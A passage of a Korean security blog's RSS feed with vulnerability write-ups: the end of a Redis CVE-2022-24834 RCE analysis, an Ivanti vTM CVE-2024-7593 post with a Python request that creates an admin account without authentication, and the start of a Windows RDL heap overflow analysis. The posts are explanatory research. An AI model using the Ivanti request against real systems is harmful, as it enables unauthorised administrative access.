&#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Remote-Code-Execution-Redis-Version-6-0-19"><a href="#Remote-Code-Execution-Redis-Version-6-0-19" class="headerlink" title="Remote Code Execution : Redis Version 6.0.19"></a>Remote Code Execution : Redis Version 6.0.19</h2><p>Redis 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB3C4; &#xC704;&#xC758; &#xB2E4;&#xB978; &#xB450; &#xBC84;&#xC804;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC77C;&#xD55C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; RCE&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC720;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC778; <code>Table</code>&#xC774; &#xC815;&#xC758;&#xAC00; &#xB2E4;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%204.png" alt="Untitled"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; Redis 6.0.19&#xC640; 7.0.11&#xC758; <code>lobject.h</code>&#xB97C; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xBA74; 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; <code>Table</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; <code>int readonly</code> &#xD544;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; <code>Table</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; <code>array</code>, <code>sizearray</code> &#xB4F1;&#xC758; &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xAE30;&#xC874;&#xBCF4;&#xB2E4; 8&#xB9CC;&#xD07C; &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> {</span>   -- CommonHeader   GCObject *next; <span class="hljs-comment">//0x0</span>   lu_byte tt;   lu_byte marked;   lu_byte flags;  <span class="hljs-comment">/* 1&lt;&lt;p means tagmethod(p) is not present */</span>   <span class="hljs-comment">//int readonly; </span>   lu_byte lsizenode;  <span class="hljs-comment">/* log2 of size of `node&apos; array */</span>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> *<span class="hljs-title">metatable</span>;</span> <span class="hljs-comment">//0x10</span>   TValue *<span class="hljs-built_in">array</span>;  <span class="hljs-comment">/* array part */</span> <span class="hljs-comment">// 0x18</span>   Node *node; <span class="hljs-comment">//0x20</span>   Node *lastfree;  <span class="hljs-comment">/* any free position is before this position */</span> <span class="hljs-comment">//0x28</span>   GCObject *gclist; <span class="hljs-comment">// 0x30</span>   <span class="hljs-keyword">int</span> sizearray;  <span class="hljs-comment">/* size of `array&apos; array */</span> <span class="hljs-comment">// 0x38</span>} Table;</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC758; &#xBCC0;&#xD654;&#xB97C; &#xAE30;&#xC874; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0; &#xBC18;&#xC601;&#xD574;&#xC8FC;&#xBA74; 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB3C4; &#xB611;&#xAC19;&#xC774; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!!! &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xC815;&#xD588;&#xB294;&#xC9C0;&#xB294; <a href="https://github.com/pwndorei/CVE-2022-24834/blob/master/exploit_6.0.19.lua">&#xC774; &#xCF54;&#xB4DC;</a>&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xC758; RCE &#xC2DC;&#xC5F0; &#xC601;&#xC0C1;&#xC744; &#xBCF4;&#xACE0; &#xB9C8;&#xCE58;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><iframe width="560" height="315" src="https://www.youtube.com/embed/TZwli5PnDrc?si=kvMEs2iudMAGtDnV" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>javascript&#xC5D0; &#xC774;&#xC5B4; Lua&#xAE4C;&#xC9C0;&#x2026; &#xBD84;&#xBA85; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xB294;&#xAC74;&#xB370; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xBB54;&#xAC00; &#xC2E0;&#xC120;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; 1&#xBC14;&#xC774;&#xD2B8;&#xC758; partial overwrite&#xB97C; RCE&#xB85C; &#xBC1C;&#xC804;&#xC2DC;&#xCF1C;&#xB098;&#xAC00;&#xB294; &#xACFC;&#xC815;&#xC774; &#xC815;&#xB9D0; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xACE0; &#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC774;&#xB7F0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB2E4;&#xC2DC; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB124;&#xC694;</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xB9C8;&#xB3C4; &#xC7AC;&#xBC0C;&#xAC8C; &#xB290;&#xAEF4;&#xC84C;&#xB358; &#xC774;&#xC720;&#xB294; &#xC544;&#xB798;&#xC758; &#xD6CC;&#xB96D;&#xD55C; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xAC00; &#xC788;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB97C; &#xC9C1;&#xC811; &#xC791;&#xC131;&#xD55C;&#xB2E4;&#xACE0; &#xCE58;&#xBA74; &#xC815;&#xB9D0; &#xC544;&#xCC14;&#xD558;&#xB124;&#xC694;&#x2026;.</p><p>&#xBB34;&#xD2BC; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD558;&#xACE0; &#xB2E4;&#xC74C;&#xC5D0; &#xB610; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><hr><ul><li><a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html</a></li><li><a href="https://github.com/convisolabs/CVE-2022-24834">https://github.com/convisolabs/CVE-2022-24834</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Redis/">Redis</category>
      
      <category domain="https://hackyboiz.github.io/tags/Integer-Overflow/">Integer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2022-24834/">CVE-2022-24834</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/18/pwndorei/1day1document_CVE-2022-24834/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-7593: Ivanti Virtual Traffic Manager (vTM)의 관리자 계정 생성으로 인한 Authentication Bypass 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/17/j0ker/2024-08-17/</link>
      <guid>https://hackyboiz.github.io/2024/08/17/j0ker/2024-08-17/</guid>
      <pubDate>Sat, 17 Aug 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://forums.ivanti.com/s/article/Security-Adviso</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Virtual-Traffic-Manager-vTM-CVE-2024-7593?language=en_US">Security Advisory: Ivanti Virtual Traffic Manager (vTM ) (CVE-2024-7593)</a></li><li><a href="https://packetstormsecurity.com/files/download/179906/ivantiadc99-bypass.txt">Ivanti ADC 9.9 Authentication Bypass</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Virtual Traffic Manager 22.2, 22.3, 22.3R2, 22.5R1, 22.6R1, 22.7R1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti Virtual Traffic Manager (vTM)&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18;&#xC758; Application Delivery Controller(ADC)&#xB85C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xBC0F; &#xAC00;&#xC0C1; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xB85C;&#xB4DC;&#xBC38;&#xB7F0;&#xC2F1;&#xACFC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB51C;&#xB9AC;&#xBC84;&#xB9AC; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-7593&#xC740; vTM&#xC5D0; &#xC784;&#xC758;&#xC758; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; CVSS 9.8&#xC744; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python">params = {     <span class="hljs-string">&apos;error&apos;</span>: <span class="hljs-number">1</span>,    <span class="hljs-string">&apos;section&apos;</span>: <span class="hljs-string">&apos;Access Management:LocalUsers&apos;</span>}          data = {    <span class="hljs-string">&apos;_form_submitted&apos;</span>: <span class="hljs-string">&apos;form&apos;</span>,    <span class="hljs-string">&apos;create_user&apos;</span>: <span class="hljs-string">&apos;Create&apos;</span>,    <span class="hljs-string">&apos;group&apos;</span>: <span class="hljs-string">&apos;admin&apos;</span>,    <span class="hljs-string">&apos;newusername&apos;</span>: new_admin_name,    <span class="hljs-string">&apos;password1&apos;</span>: new_admin_password,    <span class="hljs-string">&apos;password2&apos;</span>: new_admin_password}r = session.post(admin_portal + <span class="hljs-string">&quot;/apps/zxtm/wizard.fcgi&quot;</span>, params=params, data=data, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)</code></pre><p>&#xD30C;&#xB77C;&#xBBF8;&#xD130; <code>error</code>&#xB97C; <code>1</code>&#xB85C; &#xC124;&#xC815;&#xD558;&#xC5EC; <code>wizard.fcgi</code>&#xC758; Access Control&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xACE0; <code>section</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC744; &#xC704;&#xD55C; &#xC139;&#xC158;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xB9AC;&#xD018;&#xC2A4;&#xD2B8;&#xC758; data&#xC5D0;&#xB294; CSRF &#xBC29;&#xC9C0; &#xC6B0;&#xD68C;&#xB97C; &#xC704;&#xD55C; <code>_form_submitted</code> &#xD544;&#xB4DC;&#xC5D0;&#xB294; <code>form</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0;, &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; <code>create_user</code> &#xD544;&#xB4DC;&#xC5D0; <code>Create</code>&#xB97C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC744; &#xC704;&#xD55C; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xB123;&#xACE0; post &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">content = r.content.decode(<span class="hljs-string">&apos;utf-8&apos;</span>)print(content)<span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&apos;&lt;title&gt;2&lt;&apos;</span> <span class="hljs-keyword">in</span> content:    print(<span class="hljs-string">&quot;New user request sent&quot;</span>)    print(<span class="hljs-string">&quot;Login with username &apos;&quot;</span> + new_admin_name + <span class="hljs-string">&quot;&apos; and password &apos;&quot;</span> + new_admin_password + <span class="hljs-string">&quot;&apos;&quot;</span>)<span class="hljs-keyword">else</span>:    print(<span class="hljs-string">&quot;Unable to create new user&quot;</span>)</code></pre><p>&#xB9AC;&#xC2A4;&#xD3F0;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778; &#xD6C4; &#xC0DD;&#xC131;&#xD55C; &#xACC4;&#xC815;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB85C;&#xADF8;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti/">Ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/Virtual-Traffic-Manager/"> Virtual Traffic Manager</category>
      
      <category domain="https://hackyboiz.github.io/tags/vTM/">vTM</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-7593/">CVE-2024-7593</category>
      
      <category domain="https://hackyboiz.github.io/tags/vADC/">vADC</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/17/j0ker/2024-08-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-38077: Windows Remote Desktop Licensing Service의 Heap-based Buffer Overflow로 인한 PreAuth RCE 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/14/pwndorei/2024-08-14/</link>
      <guid>https://hackyboiz.github.io/2024/08/14/pwndorei/2024-08-14/</guid>
      <pubDate>Wed, 14 Aug 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/CloudCrowSec001/CVE-2024-38077-POC/blo</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/CloudCrowSec001/CVE-2024-38077-POC/blob/main/CVE-2024-38077.md">https://github.com/CloudCrowSec001/CVE-2024-38077-POC/blob/main/CVE-2024-38077.md</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077</a></p><ul><li>Windows Server 2016 &lt; 10.0.14393.7159</li><li>Windows Server 2019 &lt; 10.17763.6054</li><li>Windows Server 2022 23H2 &lt; 10.0.25398.1009</li><li>Windows Server 2022 &lt; 10.0.20384.2582</li><li>&#x2026;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xB77C;&#xC774;&#xC120;&#xC2F1;(RDL) &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xB77C;&#xC774;&#xC120;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xBC1C;&#xAE09;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB370;&#xC2A4;&#xD06C;&#xD1B1;&#xC5D0; &#xB300;&#xD55C; &#xC548;&#xC804;&#xD55C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xBCF4;&#xC7A5;&#xD558;&#xB294; Windows Server&#xC758; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>RDL &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD0D1; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xB450; &#xAC1C;&#xC758; &#xC138;&#xC158;&#xC744; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. 3&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC138;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; &#xB77C;&#xC774;&#xC120;&#xC2A4;&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xB9E4;&#xD574;&#xC57C;&#xD558;&#xACE0; RDL &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xB77C;&#xC774;&#xC120;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Terminal Service Licensing Procedure&#xB294; &#xC720;&#xC800;&#xB098; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Terminal Server CAL(Client Access Lisence)&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB514;&#xC790;&#xC778;&#xB418;&#xC5C8;&#xB294;&#xB370; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC544;&#xB798;&#xC758; <code>CDataCoding::DecodeData</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CDataCoding::DecodeData</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;CDataCoding *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">const</span>&#xA0;<span class="hljs-keyword">unsigned</span>&#xA0;__int16 *a2,</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">unsigned</span>&#xA0;__int8 **a3,</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">unsigned</span>&#xA0;<span class="hljs-keyword">int</span>&#xA0;*a4)</span></span><span class="hljs-function"></span>{&#xA0;&#xA0;<span class="hljs-comment">// ...</span>&#xA0;&#xA0;v4 =&#xA0;<span class="hljs-number">0</span>;&#xA0;&#xA0;v8 =&#xA0;<span class="hljs-number">0</span>;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( a3 )&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;v9 = dwBytes;<span class="hljs-comment">//[1]</span>&#xA0;&#xA0;&#xA0;&#xA0;*a3 =&#xA0;<span class="hljs-number">0</span>i64;&#xA0;&#xA0;&#xA0;&#xA0;*a4 =&#xA0;<span class="hljs-number">0</span>;&#xA0;&#xA0;&#xA0;&#xA0;ProcessHeap = GetProcessHeap();&#xA0;&#xA0;&#xA0;&#xA0;v11 = (<span class="hljs-keyword">unsigned</span>&#xA0;__int8 *)HeapAlloc(ProcessHeap,&#xA0;<span class="hljs-number">8u</span>, v9);<span class="hljs-comment">//[2]</span>&#xA0;&#xA0;&#xA0;&#xA0;v12 = v11;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( v11 )&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;memset_0(v11,&#xA0;<span class="hljs-number">0</span>, (<span class="hljs-keyword">unsigned</span>&#xA0;<span class="hljs-keyword">int</span>)dwBytes);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">while</span>&#xA0;( *a2 )<span class="hljs-comment">//[3]</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// Str is BCDFGHJKMPQRTVWXY2346789</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// a2 is user-controlled buffer</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v13 = wcschr_0(Str, *a2);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( !v13 )&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v4 =&#xA0;<span class="hljs-number">13</span>;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v18 = GetProcessHeap();&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;HeapFree(v18,&#xA0;<span class="hljs-number">0</span>, v12);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;v4;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// here change the integer a2 from base 24 to base 10</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// but does not check the length of a2</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v14 = v13 - Str;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v15 = v12;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v16 = (<span class="hljs-keyword">unsigned</span>&#xA0;<span class="hljs-keyword">int</span>)(v8 +&#xA0;<span class="hljs-number">1</span>);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">do</span>{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v17 = dword_1800D61C8 * *v15 + v14;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;*v15++ = v17;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;LODWORD(v14) = v17 &gt;&gt;&#xA0;<span class="hljs-number">8</span>;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;--v16;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}<span class="hljs-keyword">while</span>&#xA0;( v16 );&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( (_DWORD)v14 )&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v12[++v8] = v14;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;++a2;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;*a4 = dwBytes;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;*a3 = v12;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">else</span>&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;<span class="hljs-number">8</span>;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;}&#xA0;&#xA0;<span class="hljs-keyword">else</span>&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;<span class="hljs-number">87</span>;&#xA0;&#xA0;}&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;v4;}</code></pre><p>[1]&#xC5D0;&#xC11C; <code>v9</code>&#xC5D0; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; 